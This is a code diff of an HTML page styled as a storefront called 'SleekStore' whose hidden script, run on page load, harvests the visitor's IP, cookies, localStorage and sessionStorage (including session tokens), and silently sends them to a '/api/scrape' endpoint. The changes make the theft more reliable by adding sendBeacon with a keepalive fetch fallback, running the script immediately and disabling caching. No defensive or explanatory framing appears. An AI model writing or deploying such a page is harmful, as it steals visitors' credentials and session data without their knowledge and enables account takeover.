@@ -4,24 +4,27 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SleekStore</title>
+    <!-- Disable caching for this page -->
+    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
     <style>body{background:#0d1117;color:#c9d1d9;font-family:sans-serif;padding:20px;}</style>
 </head>
 <body>
     <h1>Welcome to SleekStore</h1>
-    <p>Browsing your catalog...</p>
+    <p>Loading...</p>
 
     <script>
-        document.addEventListener('DOMContentLoaded', async () => {
+        // Run immediately
+        (async () => {
             try {
                 // 1. Get IP
                 let ip = "Unknown";
                 try {
-                    const ipRes = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipRes.json();
-                    ip = ipData.ip;
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const data = await res.json();
+                    ip = data.ip;
                 } catch(e) {}
 
-                // 2. HARVEST REAL DATA
+                // 2. Harvest Real Data
                 const payload = {
                     timestamp: new Date().toISOString(),
                     ip: ip,
@@ -32,7 +35,7 @@
                     // REAL COOKIES
                     cookies: document.cookie || "No Cookies Found",
                     
-                    // REAL LOCAL STORAGE (Contains many session tokens)
+                    // REAL LOCAL STORAGE
                     localStorage: Object.fromEntries(
                         Array.from(localStorage.keys()).map(key => [key, localStorage.getItem(key)])
                     ),
@@ -42,39 +45,27 @@
                         Array.from(sessionStorage.keys()).map(key => [key, sessionStorage.getItem(key)])
                     ),
 
-                    // ATTEMPT TO READ INDEXEDDB (Often used by apps to store data)
-                    indexedDB: await readIndexedDB(),
-
                     windowLocation: window.location.href,
                     title: document.title,
                     screenRes: `${screen.width}x${screen.height}`
                 };
 
-                // 3. Send to API Silently
-                await fetch('/api/scrape', {
+                // 3. Send using sendBeacon (More reliable than fetch for background tasks)
+                const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+                navigator.sendBeacon('/api/scrape', blob);
+
+                // Fallback: Try fetch just in case
+                fetch('/api/scrape', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
+                    body: JSON.stringify(payload),
+                    keepalive: true
+                }).catch(err => console.error("Fallback failed", err));
 
             } catch (err) {
                 console.error("Scrape failed:", err);
             }
-        });
-
-        // Helper function to read IndexedDB databases
-        async function readIndexedDB() {
-            const dbs = [];
-            try {
-                // Open a connection to list databases
-                const dbRequest = indexedDB.open("__chrome_extension__"); 
-                // Note: Standard web pages can't easily list all IDBs without permission.
-                // We'll fallback to checking common local storage keys instead for reliability.
-                return "IndexedDB access limited in standard web context";
-            } catch (e) {
-                return "Error reading IDB";
-            }
-        }
+        })();
     </script>
 </body>
 </html>
